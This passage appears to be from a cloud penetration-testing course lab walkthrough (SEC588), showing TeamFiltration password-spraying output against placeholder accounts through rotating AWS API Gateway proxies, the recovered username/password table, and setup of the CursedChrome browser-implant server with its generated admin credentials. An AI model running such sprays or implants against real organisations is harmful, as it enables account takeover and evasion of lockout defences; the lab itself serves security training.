\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u255f\u256c\u256c\u255c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2502 \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2502\u2502 \u2559\u256c\u256c\u255c\u2558 \u2514\u2559\u255c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2553\u2565\u2565\u256c\u256c\u256c\u256c\u256c\u256c\u2565\u2565\u2556 \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2553\u256c\u256b\u256c\u255c\u255c\u2518 \u2559\u255c\u255c\u256c\u256b\u256c\u2510 \u2502\u2502 \u2502\u2502 \u2514\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u255c\u2559\u2569\u256c\u2556\u2553 \u2559\u256c\u256c\u256c \u2502\u2502 \u2502\u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u255c \u2559\u256c\u256b\u2556\u2556 \u2553 \u2559\u256c\u2556 \u2502\u2502 \u251c\u2502\u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c \u2553\u2556 \u2559\u256c\u256c\u256c\u256c\u256c\u256c\u2566 \u256c\u256c \u2502\u250c \u2553\u256c\u2524\u2502\u2502 \u2553\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2553\u256c\u2524 \u256c\u256c\u256c \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u255c\u255c\u255c\u256c\u256c\u2556 \u255f\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u2555 \u250c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u2524 \u2559\u2569\u2518 \u2559\u256c\u256c\u256c\u256c\u256c\u2569 \u255f\u256c\u256c \u2559\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u256c\u256c\u2556\u2556\u2556\u2566\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u2524 \u255f\u256c\u256c \u2502\u2502 \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c \u2566\u2556 \u2557\u2556 \u256c\u256c \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2514\u256c\u2510 \u2559\u256c\u2556\u2556 \u2553\u256c\u256c\u255c \u2553\u256c\u2518 \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2514\u256c\u2556 \u2559\u2569\u2568\u256c\u256c\u256c\u2569\u2568\u255c\u255c \u2552\u256c\u256c \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2559\u256c\u256c\u256c\u2556 \u250c\u2556\u256b\u256c\u255c\u2518 \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2559\u2569\u256c\u256c\u256c\u2565\u2565\u2565\u2565\u2565\u2565\u256b\u256c\u256c\u255c\u255c \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2559\u2559\u255c\u255c\u255c\u255b \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2502\u2502 \u2502 \u2553\u2556\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2502\u2502 \u256c\u2566\u2566\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2502\u2502 \u2553\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u256c\u2556\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u2514\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u255c \u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c [\u2665] TeamFiltration V3.5.2 PUBLIC, created by @Flangvik at @TrustedSec [+] Args parsed --outpath /home/sec588/Coursefiles/workdir/teamfiltration --config TeamFiltrationConfig_SEC588.json --spray --validate-login --sleep-min 1 --sleep-max 2 --jitter 1 --usernames /home/sec588/Coursefiles/workdir/usernames.txt --passwords /home/sec588/Coursefiles/workdir/passwords.txt --shuffle-users --shuffle-regions [SPRAY] 7/10/2023 5:55:54 PM EST Sleeping between 0-1 minutes for each round [FIREPROX] 7/10/2023 5:55:57 PM EST Created endpoint https://qfoh15k23f.execute-api.us-east-1.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:55:58 PM EST Created endpoint https://6sx8tyelbc.execute-api.us-east-2.amazonaws.com/fireprox/ [SPRAY] us-east-2 7/10/2023 5:55:59 PM EST Sprayed summer@CUSTOMDOMAIN.DOMAIN:SURPRISE1 => INVALID [SPRAY] us-east-2 7/10/2023 5:55:59 PM EST Sprayed beth@CUSTOMDOMAIN.DOMAIN:SURPRISE1 => INVALID [SPRAY] us-east-1 7/10/2023 5:55:59 PM EST Sprayed jerry@CUSTOMDOMAIN.DOMAIN:SURPRISE1 => VALID [SPRAY] us-east-1 7/10/2023 5:56:00 PM EST Sprayed rick@CUSTOMDOMAIN.DOMAIN:SURPRISE1 => INVALID [FIREPROX] 7/10/2023 5:56:03 PM EST Deleted endpoint https://qfoh15k23f.execute-api.us-east-1.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:56:12 PM EST Deleted endpoint https://6sx8tyelbc.execute-api.us-east-2.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:56:13 PM EST Created endpoint https://2srukgej58.execute-api.us-east-1.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:56:13 PM EST Created endpoint https://c24peto6z1.execute-api.us-east-2.amazonaws.com/fireprox/ [SPRAY] us-east-2 7/10/2023 5:56:14 PM EST Sprayed terry@CUSTOMDOMAIN.DOMAIN:SURPRISE2 => INVALID [SPRAY] us-east-2 7/10/2023 5:56:14 PM EST Sprayed jerry@CUSTOMDOMAIN.DOMAIN:SURPRISE2 => INVALID [SPRAY] us-east-2 7/10/2023 5:56:14 PM EST Sprayed rick@CUSTOMDOMAIN.DOMAIN:SURPRISE2 => VALID [SPRAY] us-east-1 7/10/2023 5:56:14 PM EST Sprayed summer@CUSTOMDOMAIN.DOMAIN:SURPRISE2 => INVALID [FIREPROX] 7/10/2023 5:56:50 PM EST Deleted endpoint https://2srukgej58.execute-api.us-east-1.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:56:50 PM EST Deleted endpoint https://c24peto6z1.execute-api.us-east-2.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:56:51 PM EST Created endpoint https://4zx14b0g2l.execute-api.us-east-1.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:56:52 PM EST Created endpoint https://3t0w65kfg8.execute-api.us-east-2.amazonaws.com/fireprox/ [SPRAY] us-east-1 7/10/2023 5:56:53 PM EST Sprayed jerry@CUSTOMDOMAIN.DOMAIN:SURPRISE3 => INVALID [SPRAY] us-east-2 7/10/2023 5:56:53 PM EST Sprayed terry@CUSTOMDOMAIN.DOMAIN:SURPRISE3 => INVALID [SPRAY] us-east-2 7/10/2023 5:56:53 PM EST Sprayed rick@CUSTOMDOMAIN.DOMAIN:SURPRISE3 => INVALID [SPRAY] us-east-1 7/10/2023 5:56:54 PM EST Sprayed summer@CUSTOMDOMAIN.DOMAIN:SURPRISE3 => INVALID [FIREPROX] 7/10/2023 5:57:05 PM EST Deleted endpoint https://4zx14b0g2l.execute-api.us-east-1.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:57:06 PM EST Deleted endpoint https://3t0w65kfg8.execute-api.us-east-2.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:57:06 PM EST Created endpoint https://9zjw7cg287.execute-api.us-east-1.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:57:07 PM EST Created endpoint https://ke9cpz8pb4.execute-api.us-east-2.amazonaws.com/fireprox/ [SPRAY] us-east-2 7/10/2023 5:57:08 PM EST Sprayed summer@CUSTOMDOMAIN.DOMAIN:SURPRISE4 => INVALID [SPRAY] us-east-1 7/10/2023 5:57:08 PM EST Sprayed rick@CUSTOMDOMAIN.DOMAIN:SURPRISE4 => INVALID [SPRAY] us-east-1 7/10/2023 5:57:08 PM EST Sprayed terry@CUSTOMDOMAIN.DOMAIN:SURPRISE4 => VALID [SPRAY] us-east-1 7/10/2023 5:57:08 PM EST Sprayed jerry@CUSTOMDOMAIN.DOMAIN:SURPRISE4 => INVALID [FIREPROX] 7/10/2023 5:57:12 PM EST Deleted endpoint https://9zjw7cg287.execute-api.us-east-1.amazonaws.com/fireprox/ [FIREPROX] 7/10/2023 5:57:46 PM EST Deleted endpoint https://ke9cpz8pb4.execute-api.us-east-2.amazonaws.com/fireprox/ Danger In certain circumstances you may see the following error (or stack trace) Unhandled exception. Amazon.APIGateway.Model.TooManyRequestsException: Too Many Requests ---> Amazon.Runtime.Internal.HttpErrorResponseException: Exception of type 'Amazon.Runtime.Internal.HttpErrorResponseException' was thrown. at Amazon.Runtime.HttpWebRequestMessage.GetResponseAsync(CancellationToken cancellationToken) at Amazon.Runtime.Internal.HttpHandler`1.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.Unmarshaller.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.ErrorHandler.InvokeAsync[T](IExecutionContext executionContext) --- End of inner exception stack trace --- at Amazon.Runtime.Internal.HttpErrorResponseExceptionHandler.HandleExceptionStream(IRequestContext requestContext, IWebResponseData httpErrorResponse, HttpErrorResponseException exception, Stream responseStream) at Amazon.Runtime.Internal.HttpErrorResponseExceptionHandler.HandleExceptionAsync(IExecutionContext executionContext, HttpErrorResponseException exception) at Amazon.Runtime.Internal.ExceptionHandler`1.HandleAsync(IExecutionContext executionContext, Exception exception) at Amazon.Runtime.Internal.ErrorHandler.ProcessExceptionAsync(IExecutionContext executionContext, Exception exception) at Amazon.Runtime.Internal.ErrorHandler.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.CallbackHandler.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.Signer.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.EndpointDiscoveryHandler.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.EndpointDiscoveryHandler.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.CredentialsRetriever.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.RetryHandler.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.RetryHandler.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.CallbackHandler.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.CallbackHandler.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.ErrorCallbackHandler.InvokeAsync[T](IExecutionContext executionContext) at Amazon.Runtime.Internal.MetricsHandler.InvokeAsync[T](IExecutionContext executionContext) at TeamFiltration.Handlers.AWSHandler.DeleteFireProxEndpoint(String fireProxId, String region) at TeamFiltration.Modules.Spray.SprayAsync(String[] args) at TeamFiltration.Program.Main(String[] args) at TeamFiltration.Program.<Main>(String[] args) [1] 26392 IOT instruction (core dumped) /opt/teamfiltration/TeamFiltration --outpath --config --spray --sleep-min If this occurs you are free to rerun the application, the stacktrace is solely due to AWS suppressing the number of API gateway requests and teamfiltration unable to handle the error. How can we review the results? We can use the --database flags. Command lines /opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --database Command lines show creds Command lines exit Danger This tool still is a work in progress and doesn't necessarily finish correctly. Please make special note that if you get 3 out of 5 or 2 out of 5 credentials this is fine. We can still work on labs even with a few passwords. If you feel that you have to get the exact number then you can attempt to delete the database and try again. Do this after class Expected results sec588@slingshot ~/Coursefiles/workdir $ /opt/teamfiltration/TeamFiltration --outpath /home/sec588/Coursefiles/workdir/teamfiltration --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --database \u2553\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u2556 \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u255f\u256c\u256c\u255c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2502 \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2502\u2502 \u2559\u256c\u256c\u255c\u2558 \u2514\u2559\u255c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2553\u2565\u2565\u256c\u256c\u256c\u256c\u256c\u256c\u2565\u2565\u2556 \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2561 \u2553\u256c\u256b\u256c\u255c\u255c\u2518 \u2559\u255c\u255c\u256c\u256b\u256c\u2510 \u2502\u2502 \u2502\u2502 \u2514\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u255c\u2559\u2569\u256c\u2556\u2553 \u2559\u256c\u256c\u256c \u2502\u2502 \u2502\u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u255c \u2559\u256c\u256b\u2556\u2556 \u2553 \u2559\u256c\u2556 \u2502\u2502 \u251c\u2502\u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c \u2553\u2556 \u2559\u256c\u256c\u256c\u256c\u256c\u256c\u2566 \u256c\u256c \u2502\u250c \u2553\u256c\u2524\u2502\u2502 \u2553\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2553\u256c\u2524 \u256c\u256c\u256c \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u255c\u255c\u255c\u256c\u256c\u2556 \u255f\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u2555 \u250c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u2524 \u2559\u2569\u2518 \u2559\u256c\u256c\u256c\u256c\u256c\u2569 \u255f\u256c\u256c \u2559\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u256c\u256c\u2556\u2556\u2556\u2566\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u2524 \u255f\u256c\u256c \u2502\u2502 \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c \u2566\u2556 \u2557\u2556 \u256c\u256c \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2514\u256c\u2510 \u2559\u256c\u2556\u2556 \u2553\u256c\u256c\u255c \u2553\u256c\u2518 \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2514\u256c\u2556 \u2559\u2569\u2568\u256c\u256c\u256c\u2569\u2568\u255c\u255c \u2552\u256c\u256c \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2559\u256c\u256c\u256c\u2556 \u250c\u2556\u256b\u256c\u255c\u2518 \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2559\u2569\u256c\u256c\u256c\u2565\u2565\u2565\u2565\u2565\u2565\u256b\u256c\u256c\u255c\u255c \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2559\u2559\u255c\u255c\u255c\u255b \u2502\u2502 \u2502 \u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2502\u2502 \u2502 \u2553\u2556\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2502\u2502 \u256c\u2566\u2566\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u2502\u2502 \u2553\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u2524 \u256c\u256c\u256c\u2556\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c \u2514\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u256c\u255c \u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c\u255c [\u2665] TeamFiltration V3.5.2 PUBLIC, created by @Flangvik at @TrustedSec [+] Args parsed --outpath /home/sec588/Coursefiles/workdir/teamfiltration --config /home/sec588/Coursefiles/workdir/TeamFiltrationConfig_SEC588.json --database [+] Attempting to load database file /home/sec588/Coursefiles/workdir/teamfiltration/TeamFiltration.db [+] Available commands: show <emails|creds|attempts|summary|fireprox> export <emails|creds|attempts|summary> <csv|json> <path> delete <*|fireprox-id> <fireprox-region> exit [?] CMD #> show creds +----+----------------------+--------------+-------+-------------------+-------------------+---------------------+ | Id | DateTime | Disqualified | Valid | ConditionalAccess | Username | Password | +----+----------------------+--------------+-------+-------------------+-------------------+---------------------+ | 18 | 7/10/2023 9:55:59 PM | False | True | True | jerry@CUSTOMDOMAIN.DOMAIN | SURPRISE1 | +----+----------------------+--------------+-------+-------------------+-------------------+---------------------+ | 23 | 7/10/2023 9:56:14 PM | False | True | True | rick@CUSTOMDOMAIN.DOMAIN | SURPRISE2 | +----+----------------------+--------------+-------+-------------------+-------------------+---------------------+ | 30 | 7/10/2023 9:56:55 PM | False | True | True | beth@CUSTOMDOMAIN.DOMAIN | SURPRISE3 | +----+----------------------+--------------+-------+-------------------+-------------------+---------------------+ | 39 | 7/10/2023 9:57:50 PM | False | True | False | summer@CUSTOMDOMAIN.DOMAIN | SURPRISE5 | +----+----------------------+--------------+-------+-------------------+-------------------+---------------------+ exit","title":"Walkthrough"},{"location":"labs/identities/03-identities/","text":"Attacking User Identities - Passwords! Brief Intro Welcome to our User Identities WorkShop Section 2, PASSWORDS! Requirements for This Lab Walkthrough On your SEC588 VM we are now going to setup our environment to run CursedChrome first. The first thing we will do is remove old docker images for CursedChrome. Please open a MATE Teriminal for this. Command lines docker image rm 3b8fa45ab626 docker image rm 2167863c43fd docker image rm d6420819df1b Now that this is complete we will use \"CursedChrome\" locally Command lines cd /opt/CursedChrome docker-compose up -d You need to get the Admin Username and Password from CursedChrome once it is running: Command lines docker-compose logs cursedchrome !!! abstract \"Expected Results ```console hl_lines=\"21-22\" sec588@slingshot:/opt/CursedChrome$ docker-compose logs cursedchrome cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:32 pm] Master 8 is running cursedchrome-cursedchrome-1 | [December 1st 2023, 6:41:32 pm] Initializing the database connection... cursedchrome-cursedchrome-1 | No session secret set, generating one now... cursedchrome-cursedchrome-1 | Session secret generated successfully! cursedchrome-cursedchrome-1 | cursedchrome-cursedchrome-1 | ============================================================================ cursedchrome-cursedchrome-1 | cursedchrome-cursedchrome-1 | \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557 \u2588\u2588\u2557 cursedchrome-cursedchrome-1 | \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551 cursedchrome-cursedchrome-1 | \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551 cursedchrome-cursedchrome-1 | \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2554\u2550\u2550\u255d \u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551 cursedchrome-cursedchrome-1 | \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551\u255a\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551 \u255a\u2588\u2588\u2588\u2588\u2551 cursedchrome-cursedchrome-1 | \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d \u255a\u2550\u2550\u2550\u255d cursedchrome-cursedchrome-1 | cursedchrome-cursedchrome-1 | vvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv cursedchrome-cursedchrome-1 | cursedchrome-cursedchrome-1 | An admin user (for the admin control panel) has been created cursedchrome-cursedchrome-1 | with the following credentials: cursedchrome-cursedchrome-1 | cursedchrome-cursedchrome-1 | USERNAME: admin cursedchrome-cursedchrome-1 | PASSWORD: 1067ac9tmctk3hrn0uu579gfnzcv3ofx cursedchrome-cursedchrome-1 | cursedchrome-cursedchrome-1 | Upon logging in to the admin control panel with these cursedchrome-cursedchrome-1 | credentials you will be prompted to change your password. cursedchrome-cursedchrome-1 | Please do so at your earliest convenience as this message cursedchrome-cursedchrome-1 | is potentially being logged by Docker. cursedchrome-cursedchrome-1 | cursedchrome-cursedchrome-1 | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ cursedchrome-cursedchrome-1 | cursedchrome-cursedchrome-1 | \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2557 \u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2557 \u2588\u2588\u2557 cursedchrome-cursedchrome-1 | \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u2588\u2588\u2554\u2550\u2550\u2550\u2550\u255d\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551\u255a\u2550\u2550\u2588\u2588\u2554\u2550\u2550\u255d\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2551 cursedchrome-cursedchrome-1 | \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2557 \u2588\u2588\u2551 cursedchrome-cursedchrome-1 | \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2554\u2550\u2550\u255d \u2588\u2588\u2551\u255a\u2588\u2588\u2557\u2588\u2588\u2551 \u2588\u2588\u2551 \u2588\u2588\u2551\u2588\u2588\u2551 